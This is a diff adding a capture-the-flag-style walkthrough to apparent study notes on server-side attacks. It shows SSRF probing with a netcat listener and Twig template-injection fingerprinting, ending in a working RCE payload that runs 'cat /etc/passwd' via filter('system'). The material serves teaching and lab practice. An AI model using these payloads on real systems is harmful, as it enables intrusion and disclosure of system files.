@@ -22,6 +22,7 @@ This document summarizes core techniques for identifying and exploiting **server
     - [Exploiting SSI](#exploiting-ssi)
   - [Extensible Stylesheet Language Transformations (XSLT)](#extensible-stylesheet-language-transformations-xslt)
     - [Exploiting XSLT](#exploiting-xslt)
+  - [Server Side Exploitation - Walkthrough](#server-side-exploitation---walkthrough)
 
 ---
 
@@ -937,3 +938,167 @@ Since arbitrary PHP functions are allowed, we can escalate from file disclosure 
 The command executes successfully on the server, resulting in full remote code execution via XSLT injection.
 
 ---
+
+## Server Side Exploitation - Walkthrough
+
+We are provided with the following target URL:
+
+```
+94.237.120.119:44445
+```
+
+Browsing to the application reveals a website for a food truck company.
+
+![Filtered output](images/exploitation.png)
+
+Interacting with the navigation links yields no visible results, suggesting that the frontend is either incomplete or relies heavily on backend-driven content. Inspecting the main page traffic reveals that the application issues three `POST` requests to an `API` endpoint. Each request corresponds to a different food truck location:
+
+```
+api=http://truckapi.htb/?id%3DFusionExpress01
+
+api=http://truckapi.htb/?id%3DFusionExpress02
+
+api=http://truckapi.htb/?id%3DFusionExpress03
+```
+
+![Filtered output](images/exploitation2.png)
+
+Each `POST` request contains two parameters, `id` and `location`:
+
+```json
+{"id": "FusionExpress01", "location": "321 Maple Lane"}
+
+{"id": "FusionExpress02", "location": "456 Oak Avenue"}
+
+{"id": "FusionExpress03", "location": "134 Main Street"}
+```
+
+![Filtered output](images/exploitation3.png)
+
+Since the application fetches data from a **remote URL**, it is a potential candidate for Server-Side Request Forgery (SSRF). To test this, we set up a local listener:
+
+```bash
+sudo nc -lvnp 8001
+```
+
+We then modify the `api` parameter to point to our listener:
+
+```bash
+api=http://10.10.14.137:8001/ssrf
+```
+
+No inbound request is received, indicating that SSRF is not present or is adequately mitigated.
+
+Next, we test for Server-Side Template Injection (SSTI). We begin by modifying the `id` parameter and observing the server’s response:
+
+```bash
+# Plain
+api=http://truckapi.htb/?id=HACKED
+
+# URL encoded
+api=http://truckapi.htb/?id%3DHACKED
+```
+
+The supplied value is reflected directly in the response:
+
+```bash
+{"id": "HACKED", "location": "321 Maple Lane"}
+```
+
+![Filtered output](images/exploitation4.png)
+
+This reflection suggests that the application dynamically renders the value of `id`, making it a viable candidate for SSTI testing.
+
+To fingerprint the template engine, we follow a standard SSTI decision tree:
+
+![Filtered output](images/ssti3.png)
+
+We begin with a common arithmetic payload:
+
+```
+api=http://truckapi.htb/?id%3D${7*7}
+```
+
+The payload is reflected verbatim in the response:
+
+```
+{"id": "${7*7}", "location": "134 Main Street"}
+```
+
+![Filtered output](images/exploitation5.png)
+
+Since the expression is not evaluated, we proceed along the "red" path and test an alternative syntax:
+
+```
+api=http://truckapi.htb/?id%3D{{7*7}}
+```
+
+This time, the expression is evaluated server-side:
+
+```
+{"id": "49", "location": "134 Main Street"}
+```
+
+![Filtered output](images/exploitation6.png)
+
+
+To further distinguish between template engines, we inject a payload that behaves differently depending on the engine:
+
+```
+api=http://truckapi.htb/?id%3D{{7*'7'}}
+```
+
+The result remains:
+
+```
+{"id": "49", "location": "134 Main Street"}
+```
+
+![Filtered output](images/exploitation7.PNG)
+
+This behavior allows us to distinguish between common engines:
+
+- Jinja evaluates `7 * '7'` as string multiplication &rarr; `7777777`
+- Twig evaluates it as numeric multiplication &rarr; `49`
+
+Since the output is `49`, we can confidently conclude that the target application is using the `Twig` template engine.
+
+To confirm the vulnerability, we inject a payload that exposes contextual information about the current template:
+
+```
+api=http://truckapi.htb/?id%3D{{_self}}
+```
+
+The server responds with internal template metadata:
+
+```
+{"id": "__string_template__0177c07c1ce875b2c81f5871e3da1c28", "location": "134 Main Street"}
+```
+
+![Filtered output](images/exploitation8.PNG)
+
+This confirms the presence of an exploitable SSTI vulnerability.
+
+Next, we attempt to achieve remote code execution by leveraging PHP’s `system()` function via Twig’s `filter()` functionality:
+
+```
+api=http://truckapi.htb/?id%3D{{+['cat+/etc/passwd']+|+filter('system')+}}
+```
+
+The server returns an error:
+
+```
+Error (3): URL using bad/illegal format or missing URL
+```
+
+![Filtered output](images/exploitation9.png)
+
+This error is likely caused by improper handling of special characters, particularly the pipe (`|`). We URL-encode the payload and retry:
+
+```
+api=http://truckapi.htb/?id%3D{{%2b['cat%2b/etc/passwd']%2b|%2bfilter('system')%2b}}
+```
+
+This time, the payload executes successfully, resulting in remote code execution and disclosure of `/etc/passwd´:
+
+![Filtered output](images/exploitation10.PNG)
